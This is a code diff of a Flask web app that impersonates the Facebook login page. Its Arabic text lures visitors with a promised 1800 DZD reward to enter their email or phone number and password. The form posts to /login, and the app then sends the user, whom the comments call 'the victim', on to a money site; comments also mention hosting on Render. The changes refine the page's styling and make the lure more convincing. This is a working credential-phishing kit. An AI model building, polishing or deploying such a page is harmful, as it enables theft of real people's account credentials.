@@ -21,18 +21,18 @@ HTML_PAGE = """
     <style>
         body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .box { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
-        .fb-logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 10px; }
-        p { font-size: 16px; color: #1c1e21; margin-bottom: 20px; font-weight: 500; }
-        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 15px; }
+        .fb-logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 15px; }
+        p { font-size: 16px; color: #1c1e21; margin-bottom: 20px; font-weight: 500; line-height: 1.4; }
+        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 15px; background-color: #f5f6f7; }
         button { width: 96%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .footer { margin-top: 20px; border-top: 1px solid #dddfe2; padding-top: 20px; }
-        .create-btn { background: #42b72a; color: white; padding: 10px 15px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 14px; }
+        .footer { margin-top: 25px; border-top: 1px solid #dddfe2; padding-top: 20px; }
+        .create-btn { background: #42b72a; color: white; padding: 10px 20px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 14px; }
     </style>
 </head>
 <body>
     <div class="box">
         <div class="fb-logo">facebook</div>
-        <p>سجل دخولك للمطالبة بمكافأة الـ 1800 دج</p>
+        <p>قم بتسجيل الدخول إلى حسابك على فيسبوك للمطالبة بمكافأة الـ 1800 دج فوراً.</p>
         <form method="POST" action="/login">
             <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
             <input type="password" name="password" placeholder="كلمة السر" required>
@@ -62,10 +62,10 @@ def login():
     except:
         pass
     
-    # تحويل الضحية لموقع الدراهم ديريكت
+    # تحويل الضحية لموقع الدراهم تلقائياً
     return redirect(MONEY_SITE)
 
 if __name__ == '__main__':
-    # استخدام بورت Render التلقائي
+    # الحصول على البورت من Render بشكل آلي
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
